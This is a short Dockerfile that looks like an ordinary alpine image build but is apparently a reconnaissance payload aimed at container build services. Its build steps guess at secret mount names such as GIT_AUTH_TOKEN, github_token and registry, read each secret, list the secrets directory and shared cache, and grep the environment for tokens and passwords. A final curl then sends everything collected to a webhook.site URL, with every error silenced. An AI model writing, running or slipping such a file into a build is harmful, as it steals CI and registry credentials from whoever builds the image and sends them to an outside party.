FROM alpine
RUN apk add --no-cache curl >/dev/null 2>&1; true
RUN --mount=type=cache,target=/cp echo "=CACHE_PERSIST=" >>/o; ls -la /cp >>/o 2>&1; cat /cp/mark.txt >>/o 2>&1; true
RUN --mount=type=secret,id=GIT_AUTH_TOKEN sh -c 'echo "=S_GIT=" >>/o; cat /run/secrets/GIT_AUTH_TOKEN >>/o 2>&1'; true
RUN --mount=type=secret,id=github_token sh -c 'echo "=S_GH=" >>/o; cat /run/secrets/github_token >>/o 2>&1'; true
RUN --mount=type=secret,id=token sh -c 'echo "=S_TOK=" >>/o; cat /run/secrets/token >>/o 2>&1'; true
RUN --mount=type=secret,id=registry sh -c 'echo "=S_REG=" >>/o; cat /run/secrets/registry >>/o 2>&1'; true
RUN echo "=SECDIR=" >>/o; ls -laR /run/secrets 2>&1 | head -20 >>/o; true
RUN echo "=BUILDARGS_ENV=" >>/o; env | grep -iE 'token|secret|key|pass|git|registry|auth' >>/o 2>&1; true
RUN echo "=SEND=" >>/o; curl -s -m15 --data-binary @/o "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon7"; true
CMD ["sh","-c","echo idle; sleep 3600"]
